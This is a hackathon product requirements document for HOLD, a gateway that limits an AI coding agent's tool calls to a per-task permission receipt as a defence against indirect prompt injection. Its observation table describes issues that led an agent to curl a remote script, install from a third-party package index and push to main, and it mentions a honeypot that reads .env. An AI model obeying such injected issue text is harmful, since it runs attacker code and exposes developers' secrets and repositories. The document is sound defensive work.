# PRD: HOLD, task-scoped tool permissions for AI coding agents

**Event:** Cyberdefense Hackathon, SF Tech Week · AWS Builder Loft · Fri 2026-10-09, build 11:00–16:30 PDT
**Team:** 2 builders
**Judges:** Guy Arazi (Pi Security), Daghan Altas (Semgrep), Zoe Steinkamp (ClickHouse), Saptarshi Banerjee (OpenAI), Pradeep Dhananjaya (AWS)
**Related:** technical spec in [SPEC.md](SPEC.md) · plan in [ROADMAP.md](ROADMAP.md) · audit of earlier claims in [REVIEW.md](REVIEW.md)

---

## 1. Problem

Coding agents now run with real tools (filesystem, network, shell, git) and read untrusted
text (issues, PR comments, docs). Simon Willison calls this combination the "lethal
trifecta": untrusted input, access to private data, and a way to send data out. Indirect
prompt injection exploits it: instructions hidden in an issue get treated as part of the
task.

Today's defenses rely on the model's judgment or on a human approving each call:
- **Model judgment is probabilistic.** Instructions disguised as diagnostics or configuration are harder for models to spot than "steal the .env file."
- **Approval prompts degrade.** Under volume, people approve without reading, and headless or CI runs have nobody to ask.

## 2. What we observed (single runs, being documented)

| Scenario | Observed behavior | Status |
|---|---|---|
| Issue asks for a "staging reproduction" via `curl -s https://<beeceptor>/reproduce_issue.py` | Claude Code ran the request; Beeceptor logged `GET /reproduce_issue.py 200` | Single observation. **Must record permission mode, model ID and version** |
| Issue asks for `pip install --index-url <third party> ...` | Claude flagged the third-party index and asked the user before installing | Model heuristics work sometimes; the fallback is a human prompt |
| General task on the fork | Claude committed and ran `git push origin main` | Single observation. **Meaningless unless permission mode is recorded**; if prompts were bypassed, say so |
| Synthetic honeypot with crude `open('.env')` + base64 | Model refused or noticed the trap | Shows models catch obvious attacks; not evidence of safety |

These are anecdotes, not measurements. We present them as motivation, with the run
details on screen, and never as proof that "Claude is unsafe."

## 3. Solution

The developer approves an **Intent Receipt** for one task. **HOLD**, an MCP tool gateway, is
the agent's only tool provider and checks every call against the receipt before
executing it.

> **Principle:** untrusted content may inform an authorized action; it cannot expand the set of authorized actions.

- **Allowed:** read `src/**`, `tests/**`, `ISSUE.md`; write `src/flask/app.py`.
- **Denied before dispatch:** any network host not granted, protected files (secrets, `.git`, CI workflows, agent config) for reads and writes, path traversal and symlink escape, unknown tools, malformed arguments.
- **Recorded:** every decision, with reason, exec status and gate latency, goes to a local audit file and ClickHouse.

No LLM runs in the enforcement path. Decisions are deterministic and testable (`harness.py`).

## 4. Users and job

**Primary:** a developer or platform engineer who runs coding agents on untrusted inputs
(issue triage, dependency bumps, CI bots). They want the agent to finish the task, and
they want enforced limits on what the agent can do beyond it, plus a record of what it tried.

## 5. Requirements

| # | Requirement | Priority | Verified by |
|---|---|---|---|
| R1 | Gate decides ALLOW/DENY from the receipt only; fails closed | P0 | `harness.py` |
| R2 | Denied operations are never dispatched | P0 | `harness.py` (zero-dispatch tests), audit `exec_status = not_run` |
| R3 | Allowed reads and writes perform real I/O inside the workspace only | P0 | `harness.py` |
| R4 | Claude Code reaches HOLD tools with built-in tools disabled | P0 | Demo run; tool list |
| R5 | Every decision lands in ClickHouse; telemetry can't affect decisions | P0 | SQL query; `harness.py` |
| R6 | Positive control: the same call succeeds when the receipt grants it | P0 | Demo run |
| R7 | Live event view + summary query | P1 | Demo |
| R8 | Semgrep scan of written content for new network/exec sinks | P1 | Test with an injected `urlopen` |
| R9 | Graph visualization; Semgrep tool-handler classification as receipt suggestions | P2 | Demo |

Out of scope: see [intent.md](intent.md).

## 6. Positioning (honest)

- **Not a first.** MCP gateways and agent guardrails already exist, and Claude Code itself has permission rules, PreToolUse hooks and a sandbox with network allowlisting. HOLD's angle is narrow: a **per-task** capability receipt, **agent-agnostic** at the MCP layer, with a **queryable decision trail**.
- **Complementary to sandboxes.** HOLD decides at the tool-call level, with the task's intent; OS sandboxes contain whatever escapes that.

### Prize tracks (claim only what's built)
Event prize tracks: ClickHouse, Semgrep, Pi, Akash, Guild AI. **We enter ClickHouse, Semgrep and Pi**; Akash and Guild AI are dropped (weak or overlapping fit), and the sponsors without tracks (OpenAI, MongoDB, ElevenLabs) are not targeted.
- **ClickHouse:** every decision is a row; the demo shows the live feed and a p50/p95-by-decision aggregate. Core (P0).
- **Semgrep:** scanning what the agent writes for newly introduced sinks, the gap HOLD can't close by policy alone. P1.
- **Pi:** strongest thematic fit (agentic product security). Pi is a prize sponsor only; no product or tech access is provided at this event, so the track is judged on fit. HOLD covers runtime agent actions; Pi covers the code. Never imply an integration.
## 7. Limitations (stated in the pitch)

1. HOLD guards only tools routed through it; it is not a sandbox or a firewall.
2. Malicious **content** written into an allowed file is allowed (R8 is the mitigation).
3. No shell or test execution: allowing it would require OS or network isolation, because write + execute = arbitrary code.
4. Per-file write receipts assume you already know the file; realistic receipts are broad on writes and strict on categories.
5. The receipt digest is not a signature; trust comes from file location and load-once.
6. Gate latency is measured per machine; path checks hit the filesystem on purpose (symlink resolution).

## 8. Success metrics (hackathon)

- The demo runs end to end twice from a reset workspace.
- All harness tests pass on the demo machine.
- ClickHouse shows the genuine demo rows.
- Every number said on stage comes from a measurement shown on screen.

## 9. Risks

| Risk | Mitigation |
|---|---|
| The model doesn't attempt the injected call live | Pre-recorded baseline; replay through the same live HOLD server, labeled |
| Venue network or ClickHouse Cloud is slow or blocked | Wake the service early; IP access list; JSONL fallback, labeled |
| A Claude Code permission refusal mistaken for a HOLD deny | `--allowedTools "mcp__hold"`; confirm the DENY in HOLD's audit log |
| A judge asks "why not just disable Bash?" | Positive control + per-task policy + audit trail |
| Overclaiming | Use only the claims in ROADMAP.md |
